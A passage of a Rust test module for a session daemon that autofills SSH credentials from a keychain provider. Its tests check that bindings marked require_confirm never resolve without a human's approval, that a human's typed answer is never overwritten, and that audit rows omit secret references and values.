        let server2 = server_with(keychain_mode(vec![b2]), &sc2.audit_log());
        let s2 = session_running("ssh", &["prod-01"], ECHO_OFF_FIXTURE);
        server2.registry.insert(Arc::clone(&s2)).expect("register");
        await_prompt(&s2, b"Password: ").await;
        let control = call(&server2, secret_args(&s2.id, 10)).await;
        assert_eq!(
            control["status"], "secret_provided",
            "the control did not resolve either, so the row above is asserting \
             nothing: {control}"
        );
        assert!(sc2.ran("prod-ssh"));

        let _ = s.signal(Signal::Kill);
        let _ = s2.signal(Signal::Kill);
    }

    /// **`require_confirm` does not resolve without an approval**, and
    /// nobody approves here.
    ///
    /// **Written when the round trip did not exist and kept, deliberately,
    /// now that it does.** Its claim has narrowed rather than lapsed: it
    /// used to say *"nothing answers a `require_confirm` binding in this
    /// build"*, and it now says *"nothing answers one that no human
    /// approved"* — which is the same sentence the operator's most
    /// explicit **ask me first** is entitled to, and the one an
    /// implementation is most likely to break by accident.
    ///
    /// The mechanism it now exercises is §17.5's expiry: `timeout_secs: 1`
    /// makes the approval window `min(120, 1 / 2)`, so the approval is
    /// raised, nobody decides, it expires, and the call falls through to
    /// the prompt path — where, with nothing attached, it times out. The
    /// provider is not consulted at any point, and no use is spent.
    ///
    /// The pairing is the same binding with the flag cleared, which does
    /// resolve — otherwise this row passes against a `select` that never
    /// matches.
    #[tokio::test]
    async fn a_binding_requiring_confirmation_does_not_resolve_yet() {
        let mut sc = Scratch::new("confirm");
        let mut b = sc.binding("prod-ssh", SSH_PROD, &format!("printf '{PROBE}\\n'\n"));
        b.require_confirm = true;
        let server = server_with(keychain_mode(vec![b.clone()]), &sc.audit_log());
        let s = session_running("ssh", &["prod-01"], ECHO_OFF_FIXTURE);
        server.registry.insert(Arc::clone(&s)).expect("register");
        await_prompt(&s, b"Password: ").await;

        let payload = call(&server, secret_args(&s.id, 1)).await;
        assert!(
            !sc.ran("prod-ssh"),
            "a require_confirm binding resolved with no approval anywhere in the tree"
        );
        fell_through_to_the_prompt(&payload, &sc, &s.id);
        assert_eq!(
            s.binding_uses().get(&sc.name("prod-ssh")),
            None,
            "a binding that never resolved spent a use"
        );

        let mut sc2 = Scratch::new("confirm-control");
        let mut cleared = sc2.binding("prod-ssh", SSH_PROD, &format!("printf '{PROBE}\\n'\n"));
        cleared.require_confirm = false;
        let server2 = server_with(keychain_mode(vec![cleared]), &sc2.audit_log());
        let s2 = session_running("ssh", &["prod-01"], ECHO_OFF_FIXTURE);
        server2.registry.insert(Arc::clone(&s2)).expect("register");
        await_prompt(&s2, b"Password: ").await;
        let control = call(&server2, secret_args(&s2.id, 10)).await;
        assert_eq!(
            control["status"], "secret_provided",
            "the control did not resolve, so the row above asserts nothing: {control}"
        );

        let _ = s.signal(Signal::Kill);
        let _ = s2.signal(Signal::Kill);
    }

    /// **A human who answers the prompt while the provider is running
    /// wins, and the resolved value is dropped rather than written.**
    ///
    /// The window is the provider's whole run — up to
    /// `keychain_provider_timeout_secs`, 10 s by default — and
    /// `attach::conn`'s `SecretInput` arm reaches the slot through
    /// `take(session_id, Some(&request_id))`, which needs only a matching
    /// id and **not** the absence of a waiter. So the human wins the race
    /// outright, and an autofill that wrote anyway would put its value
    /// into the tty input queue *behind* theirs, where the child's **next**
    /// read consumes it. That is what the two-read child below makes
    /// visible: a second value shows up as a second `got=` line.
    ///
    /// The race is made deterministic rather than waited for: the fixture
    /// blocks on a gate file, the row takes the slot and writes the
    /// human's value while it is blocked, and only then opens the gate.
    ///
    /// **The pairing is the same row without the interference**, which
    /// *does* produce `got=HUNTER2` — without it, `!contains("got=HUNTER2")`
    /// passes against a fixture that never resolved anything.
    #[tokio::test]
    async fn a_human_answering_during_the_provider_call_is_not_overwritten() {
        // Two reads, so a value left in the input queue by a second write
        // is consumed and printed rather than discarded at exit.
        let two_reads = format!("{ECHO_OFF_FIXTURE}; {ECHO_OFF_FIXTURE}");

        // ---- the race, lost by the autofill on purpose
        let mut sc = Scratch::new("lostslot");
        let gate = sc.path("gate");
        let b = sc.binding(
            "slot",
            SSH_PROD,
            &format!(
                "until [ -f '{}' ]; do sleep 1; done\nprintf '{PROBE}\\n'\n",
                gate.display()
            ),
        );
        let server = Arc::new(server_with(keychain_mode(vec![b]), &sc.audit_log()));
        let s = session_running("ssh", &["prod-01"], &two_reads);
        server.registry.insert(Arc::clone(&s)).expect("register");
        await_prompt(&s, b"Password: ").await;

        // The echo-drop raise a client would have made (§7.5), so the
        // slot is occupied when the call starts.
        let (raised, first) = server.attach_hub().raise_secret(&s.id, "Password: ");
        assert!(first, "the row, not something else, raised this request");

        let call = {
            let server = Arc::clone(&server);
            let args = secret_args(&s.id, 2);
            tokio::spawn(async move { server.request_secret_input(Parameters(args)).await })
        };

        // The provider has started and is blocked on the gate.
        await_ran(&sc, "slot").await;

        // The human answers, exactly as `attach::conn` does: take the slot
        // by id, then queue the write.
        let taken = server
            .attach_hub()
            .close_secret(&s.id, Some(&raised.request_id))
            .expect("the human took the slot while the provider was running");
        drop(taken);
        write_as_a_human(&s, b"humanpw").await;
        buffer_until(&s, b"got=HUMANPW", 20).await;

        // Only now does the provider answer.
        std::fs::write(&gate, b"go").expect("open the gate");

        let payload = body(
            &tokio::time::timeout(Duration::from_secs(60), call)
                .await
                .expect("the call never returned")
                .expect("the call task")
                .expect("request_secret_input"),
        );
        assert_eq!(
            payload["status"], "secret_cancelled",
            "the call reported a write it must not have made: {payload}"
        );

        let seen = buffered(&s);
        assert!(
            !contains(&seen, b"got=HUNTER2"),
            "the resolved value was written on top of the human's answer, and the \
             child's next read consumed it:\n{}",
            String::from_utf8_lossy(&seen)
        );
        assert_eq!(
            seen.windows(4).filter(|w| *w == b"got=").count(),
            1,
            "the child completed more than one read:\n{}",
            String::from_utf8_lossy(&seen)
        );
        // The binding still resolved — §9.6 counts resolutions from the
        // store, not values written to a PTY — so the trail says so.
        assert!(
            sc.kinds(&s.id).iter().any(|k| k == "binding_resolved"),
            "the provider ran and produced a value; the trail should say so"
        );
        let _ = s.signal(Signal::Kill);

        // ---- the pairing: identical, minus the interference
        let mut sc2 = Scratch::new("lostslot-control");
        let gate2 = sc2.path("gate");
        let b2 = sc2.binding(
            "slot",
            SSH_PROD,
            &format!(
                "until [ -f '{}' ]; do sleep 1; done\nprintf '{PROBE}\\n'\n",
                gate2.display()
            ),
        );
        let server2 = Arc::new(server_with(keychain_mode(vec![b2]), &sc2.audit_log()));
        let s2 = session_running("ssh", &["prod-01"], &two_reads);
        server2.registry.insert(Arc::clone(&s2)).expect("register");
        await_prompt(&s2, b"Password: ").await;
        let (raised2, _) = server2.attach_hub().raise_secret(&s2.id, "Password: ");

        let call2 = {
            let server = Arc::clone(&server2);
            let args = secret_args(&s2.id, 10);
            tokio::spawn(async move { server.request_secret_input(Parameters(args)).await })
        };
        await_ran(&sc2, "slot").await;
        std::fs::write(&gate2, b"go").expect("open the gate");

        let control = body(
            &tokio::time::timeout(Duration::from_secs(60), call2)
                .await
                .expect("the control call never returned")
                .expect("the control task")
                .expect("request_secret_input"),
        );
        assert_eq!(
            control["status"], "secret_provided",
            "nobody took the slot and the autofill still did not write, so the row \
             above is asserting nothing: {control}"
        );
        assert_eq!(
            control["data"]["request_id"], raised2.request_id,
            "the autofill closed a request other than the one it found"
        );
        buffer_until(&s2, b"got=HUNTER2", 20).await;
        let _ = s2.signal(Signal::Kill);
    }

    /// **A raise that appears inside the provider window and is adopted by
    /// another tool call is not the autofill's to satisfy either.**
    ///
    /// This is the row above seen from the other side. There the slot was
    /// occupied when the call began; here it is **vacant**, which is the
    /// ordinary anticipatory pattern — `start_session("ssh prod-01")`
    /// followed immediately by `request_secret_input`, before the child has
    /// drawn its prompt — so the echo-drop raise appears inside the window
    /// by construction. If another call has adopted it by the time the
    /// provider answers, that call owns the answer, and a credential
    /// written into the PTY behind it is the same two-values-in-one-`getpass`
    /// failure.
    ///
    /// **The pairing is the same window with nobody waiting**, where the
    /// autofill *does* write and closes the raise it found — without which
    /// this row passes against an autofill that stopped writing altogether.
    #[tokio::test]
    async fn a_raise_adopted_inside_the_provider_window_is_not_the_autofills() {
        let two_reads = format!("{ECHO_OFF_FIXTURE}; {ECHO_OFF_FIXTURE}");

        // ---- adopted inside the window: the autofill must not write
        let mut sc = Scratch::new("adoptedwindow");
        let gate = sc.path("gate");
        let b = sc.binding(
            "slot",
            SSH_PROD,
            &format!(
                "until [ -f '{}' ]; do sleep 1; done\nprintf '{PROBE}\\n'\n",
                gate.display()
            ),
        );
        let server = Arc::new(server_with(keychain_mode(vec![b]), &sc.audit_log()));
        let s = session_running("ssh", &["prod-01"], &two_reads);
        server.registry.insert(Arc::clone(&s)).expect("register");
        await_prompt(&s, b"Password: ").await;
        // **Vacant**, deliberately: this row is about the other branch.
        assert!(
            server.attach_hub().outstanding_secret(&s.id).is_none(),
            "this row is about a slot that was vacant when the call began"
        );

        let call = {
            let server = Arc::clone(&server);
            let args = secret_args(&s.id, 2);
            tokio::spawn(async move { server.request_secret_input(Parameters(args)).await })
        };
        await_ran(&sc, "slot").await;

        // A second tool call arrives and registers its waiter while the
        // provider is still blocked. Driven through the slot directly
        // rather than through a second `request_secret_input`, so the row
        // measures one autofill rather than two racing each other.
        let other = server
            .attach_hub()
            .secrets()
            .raise_or_adopt(&s.id, "another call", Some(4096), true)
            .expect("a vacant slot raises");
        assert!(server.attach_hub().secrets().has_waiter(&s.id));

        std::fs::write(&gate, b"go").expect("open the gate");

        let payload = body(
            &tokio::time::timeout(Duration::from_secs(60), call)
                .await
                .expect("the call never returned")
                .expect("the call task")
                .expect("request_secret_input"),
        );
        // It fell through, and then collided with the waiter it refused to
        // write past — which is the correct §5.2 answer for a second call.
        assert_eq!(
            payload["status"], "secret_cancelled",
            "the autofill wrote past a request another call is waiting on: {payload}"
        );
        assert_eq!(
            payload["data"]["reason"], "concurrent_request_pending",
            "expected the collision the fall-through leads to: {payload}"
        );
        let seen = buffered(&s);
        assert!(
            !contains(&seen, b"got=HUNTER2"),
            "the resolved value was written into a request another call owns:\n{}",
            String::from_utf8_lossy(&seen)
        );
        assert_eq!(
            seen.windows(4).filter(|w| *w == b"got=").count(),
            0,
            "the child completed a read on a row where nothing should have been \
             written to it:\n{}",
            String::from_utf8_lossy(&seen)
        );
        // The other call's request is untouched — refused, not half-taken.
        assert!(
            server
                .attach_hub()
                .secrets()
                .matches_outstanding(&s.id, &other.request_id),
            "the refusal disturbed the request it refused to take"
        );
        drop(other);
        let _ = s.signal(Signal::Kill);

        // ---- the pairing: the same window, nobody waiting
        let mut sc2 = Scratch::new("adoptedwindow-control");
        let gate2 = sc2.path("gate");
        let b2 = sc2.binding(
            "slot",
            SSH_PROD,
            &format!(
                "until [ -f '{}' ]; do sleep 1; done\nprintf '{PROBE}\\n'\n",
                gate2.display()
            ),
        );
        let server2 = Arc::new(server_with(keychain_mode(vec![b2]), &sc2.audit_log()));
        let s2 = session_running("ssh", &["prod-01"], &two_reads);
        server2.registry.insert(Arc::clone(&s2)).expect("register");
        await_prompt(&s2, b"Password: ").await;

        let call2 = {
            let server = Arc::clone(&server2);
            let args = secret_args(&s2.id, 10);
            tokio::spawn(async move { server.request_secret_input(Parameters(args)).await })
        };
        await_ran(&sc2, "slot").await;
        // A raise with **no** waiter — an echo drop a client announced and
        // nobody has answered. That one *is* this value's to close.
        let (appeared, first) = server2.attach_hub().raise_secret(&s2.id, "Password: ");
        assert!(first);
        std::fs::write(&gate2, b"go").expect("open the gate");

        let control = body(
            &tokio::time::timeout(Duration::from_secs(60), call2)
                .await
                .expect("the control call never returned")
                .expect("the control task")
                .expect("request_secret_input"),
        );
        assert_eq!(
            control["status"], "secret_provided",
            "an unadopted raise appearing inside the window blocked the autofill, so \
             the row above is asserting nothing: {control}"
        );
        assert_eq!(
            control["data"]["request_id"], appeared.request_id,
            "the autofill did not close the raise it found"
        );
        buffer_until(&s2, b"got=HUNTER2", 20).await;
        let _ = s2.signal(Signal::Kill);
    }

    /// **GH #35: a raise that appears *and is answered* inside the provider
    /// window, starting from a vacant slot.**
    ///
    /// The two rows above cover the raise that was there **before** the
    /// call (an id to compare) and the raise that appears and is **adopted**
    /// (a waiter to see). This is the third sequence and the one neither
    /// could see: from a vacant slot, an echo drop raises and a human at an
    /// attached client answers it, all inside the provider's window. The
    /// slot is vacant again, which is byte-for-byte what "nothing ever
    /// happened" looks like — so a re-check of vacancy passes and the
    /// autofill writes on top of the human's answer. Reproduced with a
    /// throwaway probe before the fix: `secret_provided`, **8 bytes
    /// written**, the child's `got=` count **2**, `got=HUNTER2` present.
    ///
    /// It is the ordinary anticipatory pattern rather than a corner:
    /// `start_session("ssh prod-01")` followed immediately by
    /// `request_secret_input`, before the prompt has been drawn, is exactly
    /// a vacant-slot call.
    ///
    /// **The pairing is the same window with the human's answer removed**,
    /// which *does* produce `got=HUNTER2` — without it,
    /// `!contains("got=HUNTER2")` passes against an autofill that stopped
    /// writing at all. The two-read child is what makes a second value
    /// visible: without it a value left in the tty input queue is simply
    /// discarded at exit and the defect is invisible.
    #[tokio::test]
    async fn a_raise_answered_inside_the_provider_window_is_not_overwritten() {
        let two_reads = format!("{ECHO_OFF_FIXTURE}; {ECHO_OFF_FIXTURE}");

        // ---- raised and answered inside the window: no write
        let mut sc = Scratch::new("gh35");
        let gate = sc.path("gate");
        let b = sc.binding(
            "slot",
            SSH_PROD,
            &format!(
                "until [ -f '{}' ]; do sleep 1; done\nprintf '{PROBE}\\n'\n",
                gate.display()
            ),
        );
        let server = Arc::new(server_with(keychain_mode(vec![b]), &sc.audit_log()));
        let s = session_running("ssh", &["prod-01"], &two_reads);
        server.registry.insert(Arc::clone(&s)).expect("register");
        await_prompt(&s, b"Password: ").await;
        // **Vacant**, deliberately: with a raise outstanding this row is
        // the id comparison's, not the closure count's.
        assert!(
            server.attach_hub().outstanding_secret(&s.id).is_none(),
            "this row is about a slot that was vacant when the call began"
        );

        let call = {
            let server = Arc::clone(&server);
            let args = secret_args(&s.id, 2);
            tokio::spawn(async move { server.request_secret_input(Parameters(args)).await })
        };
        // The provider has started and is blocked on the gate, so
        // everything below happens strictly inside the window.
        await_ran(&sc, "slot").await;

        // The echo-drop raise `attach::conn`'s `forward_events` makes, and
        // then a human answering it — `close_secret` by id, then the write,
        // which is exactly what that arm does.
        let (appeared, first) = server.attach_hub().raise_secret(&s.id, "Password: ");
        assert!(first, "the row, not something else, raised this request");
        let taken = server
            .attach_hub()
            .close_secret(&s.id, Some(&appeared.request_id))
            .expect("the human took the slot while the provider was running");
        drop(taken);
        write_as_a_human(&s, b"humanpw").await;
        buffer_until(&s, b"got=HUMANPW", 20).await;
        assert!(
            server.attach_hub().outstanding_secret(&s.id).is_none(),
            "the arrangement must leave the slot vacant again, or this row is about \
             the id comparison"
        );

        std::fs::write(&gate, b"go").expect("open the gate");

        let payload = body(
            &tokio::time::timeout(Duration::from_secs(60), call)
                .await
                .expect("the call never returned")
                .expect("the call task")
                .expect("request_secret_input"),
        );
        assert_eq!(
            payload["status"], "secret_cancelled",
            "the call reported a write it must not have made: {payload}"
        );

        let seen = buffered(&s);
        assert!(
            !contains(&seen, b"got=HUNTER2"),
            "the resolved value was written on top of the human's answer, and the \
             child's next read consumed it:\n{}",
            String::from_utf8_lossy(&seen)
        );
        assert_eq!(
            seen.windows(4).filter(|w| *w == b"got=").count(),
            1,
            "the child completed more than one read:\n{}",
            String::from_utf8_lossy(&seen)
        );
        // The binding still resolved — §9.6 counts resolutions from the
        // store, not values written to a PTY.
        assert!(
            sc.kinds(&s.id).iter().any(|k| k == "binding_resolved"),
            "the provider ran and produced a value; the trail should say so"
        );
        let _ = s.signal(Signal::Kill);

        // ---- the pairing: identical, minus the human's answer
        let mut sc2 = Scratch::new("gh35-control");
        let gate2 = sc2.path("gate");
        let b2 = sc2.binding(
            "slot",
            SSH_PROD,
            &format!(
                "until [ -f '{}' ]; do sleep 1; done\nprintf '{PROBE}\\n'\n",
                gate2.display()
            ),
        );
        let server2 = Arc::new(server_with(keychain_mode(vec![b2]), &sc2.audit_log()));
        let s2 = session_running("ssh", &["prod-01"], &two_reads);
        server2.registry.insert(Arc::clone(&s2)).expect("register");
        await_prompt(&s2, b"Password: ").await;

        let call2 = {
            let server = Arc::clone(&server2);
            let args = secret_args(&s2.id, 10);
            tokio::spawn(async move { server.request_secret_input(Parameters(args)).await })
        };
        await_ran(&sc2, "slot").await;
        std::fs::write(&gate2, b"go").expect("open the gate");

        let control = body(
            &tokio::time::timeout(Duration::from_secs(60), call2)
                .await
                .expect("the control call never returned")
                .expect("the control task")
                .expect("request_secret_input"),
        );
        assert_eq!(
            control["status"], "secret_provided",
            "nothing interfered and the autofill still did not write, so the row \
             above is asserting nothing: {control}"
        );
        buffer_until(&s2, b"got=HUNTER2", 20).await;
        let _ = s2.signal(Signal::Kill);
    }

    /// **Every [`FellThrough`] variant, driven.**
    ///
    /// The enum's fields are read by nothing on the call path — the
    /// caller matches `FellThrough(_)` and falls through, which is the
    /// whole design — so without this row they are decoration, and a
    /// variant that no input can produce is a classification nobody has
    /// checked. This drives all five, against one session, through the
    /// public entry point.
    ///
    /// It is a `#[test]` rather than a `#[tokio::test]`: [`autofill`] is
    /// synchronous, and the one path here that runs a provider does so
    /// through a fixture that exits immediately.
    #[test]
    fn every_fall_through_reason_is_reachable() {
        let mut sc = Scratch::new("reasons");
        let failing = sc.binding("fails", SSH_PROD, "exit 3\n");
        let server = server_with(keychain_mode(vec![failing.clone()]), &sc.audit_log());
        let audit = &server.processor.audit;
        let s = session_running("ssh", &["prod-01"], "sleep 30");

        let prompt_mode = SecurityConfig {
            secret_bindings: vec![failing.clone()],
            ..SecurityConfig::default()
        };
        assert_eq!(
            autofill_reason(&prompt_mode, &s, audit),
            FellThrough::ModeIsPrompt
        );

        let no_match = keychain_mode(vec![plain_binding("nope", "^psql\\s+-h\\s+prod$")]);
        assert_eq!(
            autofill_reason(&no_match, &s, audit),
            FellThrough::NoBindingMatched
        );

        let mut confirmed = failing.clone();
        confirmed.require_confirm = true;
        assert_eq!(
            autofill_reason(&keychain_mode(vec![confirmed]), &s, audit),
            FellThrough::NeedsApproval {
                binding_name: failing.name.clone(),
                // The frame needs it, so the variant carries it — and a
                // `provider` that came back wrong would put the wrong
                // credential's name in front of the human approving it.
                provider: "pass".to_string(),
            }
        );

        // The provider runs and exits 3 — and gives its claim back, which
        // is what lets the next case start from a clean budget.
        assert_eq!(
            autofill_reason(&keychain_mode(vec![failing.clone()]), &s, audit),
            FellThrough::ProviderRefused {
                binding_name: failing.name.clone(),
                provider: "pass".to_string(),
            }
        );
        assert!(
            sc.ran("fails"),
            "the ProviderRefused case never ran anything"
        );
        assert_eq!(
            s.binding_uses().get(&failing.name),
            None,
            "the failed resolution kept its claim"
        );

        // Exhaustion needs a spent budget, so spend it: `max_uses = 1`
        // with the count already at 1.
        let mut bounded = failing.clone();
        bounded.max_uses = Some(1);
        assert_eq!(s.claim_binding_use(&bounded.name, Some(1)), Some(1));
        assert_eq!(
            autofill_reason(&keychain_mode(vec![bounded]), &s, audit),
            FellThrough::Exhausted {
                binding_name: failing.name.clone(),
                max_uses: 1,
            }
        );

        let _ = s.signal(Signal::Kill);
    }

    /// [`autofill`], asserting it fell through and handing back why.
    fn autofill_reason(
        security: &SecurityConfig,
        session: &Session,
        audit: &AuditLog,
    ) -> FellThrough {
        match autofill(security, session, true, audit) {
            Autofill::FellThrough(why) => why,
            Autofill::Resolved(r) => panic!("expected a fall-through, got {r:?}"),
        }
    }

    // ------------------------------------------------- §9.4's audit row

    /// §9.4's `binding_resolved`: `{binding_name, provider, session_id,
    /// use_count}` — and **neither the reference nor the value**, anywhere
    /// in the file.
    ///
    /// The mutation is one `serde_json::to_value(binding)` away and puts
    /// the reference in the audit trail.
    #[tokio::test]
    async fn binding_resolved_records_the_name_and_never_the_reference() {
        let mut sc = Scratch::new("auditrow");
        let b = sc.binding("prod-ssh", SSH_PROD, &format!("printf '{PROBE}\\n'\n"));
        let server = server_with(keychain_mode(vec![b]), &sc.audit_log());
        let s = session_running("ssh", &["prod-01"], ECHO_OFF_FIXTURE);
        server.registry.insert(Arc::clone(&s)).expect("register");
        await_prompt(&s, b"Password: ").await;

        let payload = call(&server, secret_args(&s.id, 10)).await;
        assert_eq!(payload["status"], "secret_provided", "{payload}");
        buffer_until(&s, b"got=HUNTER2", 20).await;

        let entries = sc.audit(&s.id);
        let resolved: Vec<&Value> = entries
            .iter()
            .filter(|e| e["kind"] == "binding_resolved")
            .collect();
        assert_eq!(resolved.len(), 1, "expected one entry, got {resolved:?}");
        let row = resolved[0];
        // §9.4's four fields, `session_id` among them — the row lists it
        // and the table is the catalogue, so it is inside `fields` as well
        // as being `record`'s own parameter.
        assert_eq!(row["binding_name"], sc.name("prod-ssh"));
        assert_eq!(row["provider"], "pass");
        assert_eq!(row["session_id"], s.id.as_str());
        assert_eq!(row["use_count"], 1);

        let text = sc.audit_text();
        assert!(
            !text.contains(REFERENCE),
            "the reference reached the audit trail:\n{text}"
        );
        assert!(
            !text.contains(PROBE),
            "the resolved value reached the audit trail:\n{text}"
        );
        // **Two controls.** The trail is live and this session's line is in
        // it (the four assertions above already prove that), and the
        // reference is a string the *redactor* leaves alone — so its
        // absence is this module's doing and not the redactor's.
        let rules = server.processor.rules.clone();
        assert_eq!(
            crate::output::redact::redact_str(&rules, REFERENCE),
            REFERENCE,
            "the reference matches a redaction rule, so its absence above proves \
             nothing about this module"
        );
        assert_eq!(
            crate::output::redact::redact_str(&rules, PROBE),
            PROBE,
            "the probe matches a redaction rule, so its absence above proves nothing"
        );

        let _ = s.signal(Signal::Kill);
    }

    /// **Task 9's owed row, now writable.** A provider that fails puts
    /// neither its `reference` nor its stderr into the **audit** trail.
    ///
    /// Task 9 asserted this against `daemon.log` and left the `audit.log`
    /// half out on purpose, saying so in
    /// `a_failing_providers_stderr_and_reference_reach_no_log`'s own doc
    /// comment: nothing in the milestone up to that point wrote a provider
    /// outcome to the audit trail, so an absence assertion there would have
    /// been an absence assertion against a file no implementation wrote to
    /// — Global Constraint 3's decorative shape. `binding_resolved` is this
    /// task's, so the row is written here.
    ///
    /// **The pairing that stops it being vacuous:** this call *does* write
    /// to the audit trail (the prompt path's `secret_input_request` and
    /// `secret_input_resolved`), so the file exists, is non-empty, and
    /// carries this session — the two absences are absences from a
    /// populated file.
    #[tokio::test]
    async fn a_failing_providers_reference_and_stderr_reach_no_audit_line() {
        const STDERR_CANARY: &str = "gpg-agent-refused-prod-db-canary";
        let mut sc = Scratch::new("failaudit");
        let b = sc.binding(
            "prod-ssh",
            SSH_PROD,
            &format!("echo '{STDERR_CANARY}' >&2\nexit 2\n"),
        );
        let server = server_with(keychain_mode(vec![b]), &sc.audit_log());
        let s = session_running("ssh", &["prod-01"], ECHO_OFF_FIXTURE);
        server.registry.insert(Arc::clone(&s)).expect("register");
        await_prompt(&s, b"Password: ").await;

        let payload = call(&server, secret_args(&s.id, 1)).await;

        assert!(sc.ran("prod-ssh"), "the failing provider never ran at all");
        fell_through_to_the_prompt(&payload, &sc, &s.id);

        let text = sc.audit_text();
        assert!(!text.is_empty(), "the audit trail is empty");
        assert!(
            !text.contains(REFERENCE),
            "a failing provider's reference reached the audit trail:\n{text}"
        );
        assert!(
            !text.contains(STDERR_CANARY),
            "a failing provider's stderr reached the audit trail:\n{text}"
        );
        // And the budget was not spent on a failure.
        assert_eq!(
            s.binding_uses().get(&sc.name("prod-ssh")),
            None,
            "a locked keyring spent a use of the operator's max_uses budget"
        );

        let _ = s.signal(Signal::Kill);
    }

    // ------------------------------------------------ Global Constraint 14

    /// GC14, executed: this file's `ECHO_OFF_FIXTURE` is the integration
    /// suite's, and `secret::provider`'s is too.
    ///
    /// Three targets cannot share a constant, and a comment saying "keep
    /// these in sync" is what drift looks like the day before it happens.
    /// Each copy is checked against the original's **source text** — the
    /// `tests/source_guards.rs` idiom for a guarantee invisible from
    /// inside the program. Source text and not the decoded value on
    /// purpose: GC14's requirement is one *spelling*, so a copy writing
    /// `\n` where the original writes `\\n` differs here as it should.
    #[test]
    fn the_echo_off_fixture_here_is_the_one_in_the_integration_suite_too() {
        let manifest = Path::new(env!("CARGO_MANIFEST_DIR"));
        let theirs = declared_echo_off_fixture(&manifest.join("tests").join("secrets.rs"));
        let ours =
            declared_echo_off_fixture(&manifest.join("src").join("secret").join("binding.rs"));
        let providers =
            declared_echo_off_fixture(&manifest.join("src").join("secret").join("provider.rs"));
        assert_eq!(
            ours, theirs,
            "GC14: two spellings of the one echo-off fixture"
        );
        assert_eq!(
            providers, theirs,
            "GC14: `secret::provider`'s copy has drifted from the integration suite's"
        );
        // Two pairings, because the rows above are satisfied by an
        // extractor that returns the same wrong thing three times: what it
        // returned is recognisably the fixture, and it is **not** the
        // spelling 0.0.6 rules out by name.
        assert!(
            ours.contains("stty -echo") && ours.contains("read x"),
            "the extractor returned something that is not the fixture: {ours}"
        );
        assert!(
            !ours.contains("read -s"),
            "`read -s` does not exist in dash and clears ICANON in bash: {ours}"
        );
    }

    /// The `ECHO_OFF_FIXTURE` literal as it is **written**, with only the
    /// `\<newline>` continuation and its indentation folded out.
    fn declared_echo_off_fixture(path: &Path) -> String {
        let text = std::fs::read_to_string(path)
            .unwrap_or_else(|e| panic!("read {}: {e}", path.display()));
        let (_, after) = text
            .split_once("const ECHO_OFF_FIXTURE: &str = ")
            .unwrap_or_else(|| panic!("no ECHO_OFF_FIXTURE declaration in {}", path.display()));
        let (literal, _) = after
            .split_once(";\n")
            .unwrap_or_else(|| panic!("the declaration in {} does not end", path.display()));
        // A Rust string continuation is a backslash, a newline and the
        // following indentation — all of which are the *formatter's*, not
        // the fixture's.
        let mut folded = String::new();
        let mut chars = literal.chars().peekable();
        while let Some(c) = chars.next() {
            if c == '\\' && chars.peek() == Some(&'\n') {
                chars.next();
                while chars.peek().is_some_and(|c| *c == ' ') {
                    chars.next();
                }
                continue;
            }
            folded.push(c);
        }
        folded
    }

    // ------------------------------------- §17.5's approval harness
    //
    // **A fake attached client and not a socket.** Every row below needs a
    // provider that *runs*, which forces the library target (see the
    // fixture note at the top of this module), and a library target has no
    // `attach.sock`. What it can have is the thing the daemon actually
    // fans out to: one `AttachConn` on the hub, with the test on the
    // reading end of the same bounded `mpsc` a real connection's writer
    // task drains. So the frames asserted here are the frames a human's
    // client would have received, produced by the same
    // `broadcast_binding_approval` call. What is *not* covered from here
    // is the wire — the decode, the ReadOnly gate and the `frame_kind` on
    // a refusal — and those rows live in `tests/secrets.rs`, over a real
    // socket, where they need no provider.

    /// One attached client on the hub, with everything it received.
    struct FakeClient {
        session_id: String,
        client_id: u64,
        rx: tokio::sync::mpsc::Receiver<ServerFrame>,
        /// **Everything ever received, kept.** REQ-SEC-016's assertion is
        /// over *every* frame for the whole flow, before and after
        /// approval; a helper that returned only the latest would make
        /// that assertion a claim about one frame.
        seen: Vec<ServerFrame>,
    }

    fn attach_fake(server: &HoldfastServer, session_id: &str) -> FakeClient {
        let hub = server.attach_hub();
        let (tx, rx) = tokio::sync::mpsc::channel(crate::attach::hub::ATTACH_QUEUE_FRAMES);
        let client_id = hub.next_client_id();
        hub.register(Arc::new(AttachConn {
            client_id,
            session_id: session_id.to_string(),
            mode: AttachMode::ReadWrite,
            role: AttachRole::Interactive,
            client_kind: ClientKind::Cli,
            client_version: "test".to_string(),
            peer_pid: None,
            peer_uid: 0,
            tx,
            connected_at: std::time::Instant::now(),
        }));
        FakeClient {
            session_id: session_id.to_string(),
            client_id,
            rx,
            seen: Vec::new(),
        }
    }

    impl FakeClient {
        /// Everything queued right now, added to [`Self::seen`].
        fn drain(&mut self) {
            while let Ok(f) = self.rx.try_recv() {
                self.seen.push(f);
            }
        }

        /// Wait for a frame matching `pred`, or fail — **never hang**.
        async fn wait_for(
            &mut self,
            what: &str,
            pred: impl Fn(&ServerFrame) -> bool,
        ) -> ServerFrame {
            let deadline = tokio::time::Instant::now() + Duration::from_secs(20);
            loop {
                self.drain();
                if let Some(f) = self.seen.iter().find(|f| pred(f)) {
                    return f.clone();
                }
                assert!(
                    tokio::time::Instant::now() < deadline,
                    "no {what} reached the client; it saw {:?}",
                    self.seen
                );
                tokio::time::sleep(Duration::from_millis(10)).await;
            }
        }

        fn has(&self, pred: impl Fn(&ServerFrame) -> bool) -> bool {
            self.seen.iter().any(pred)
        }

        fn unregister(&self, server: &HoldfastServer) {
            server
                .attach_hub()
                .unregister(&self.session_id, self.client_id);
        }
    }

    fn is_approval(f: &ServerFrame) -> bool {
        matches!(f, ServerFrame::BindingApprovalRequired { .. })
    }

    fn is_awaiting(f: &ServerFrame) -> bool {
        matches!(f, ServerFrame::AwaitingSecret { .. })
    }

    /// Poll until §17.5's `Pending` really exists, and hand it back.
    ///
    /// Read-only, like `SecretSlots::has_waiter`: the obvious way to ask
    /// this from outside would be to try `raise`, and that would take the
    /// slot from the call being observed.
    async fn await_approval(server: &HoldfastServer, session_id: &str) -> crate::secret::Approval {
        let deadline = tokio::time::Instant::now() + Duration::from_secs(20);
        loop {
            if let Some(a) = server.attach_hub().approvals().outstanding(session_id) {
                return a;
            }
            assert!(
                tokio::time::Instant::now() < deadline,
                "no binding approval was ever raised"
            );
            tokio::time::sleep(Duration::from_millis(10)).await;
        }
    }

    /// The decision, as `attach::conn`'s `ApproveBinding` arm makes it —
    /// same call, same arguments, `decided_by` off the connection.
    fn decide(
        server: &HoldfastServer,
        session_id: &str,
        approval_id: &str,
        decision: ApprovalDecision,
        who: &str,
    ) -> crate::secret::Decide {
        server
            .attach_hub()
            .approvals()
            .decide(session_id, approval_id, decision, who)
    }

    /// Answer the outstanding secret request exactly as `attach::conn`'s
    /// `SecretInput` arm does: take the slot by id, write through the
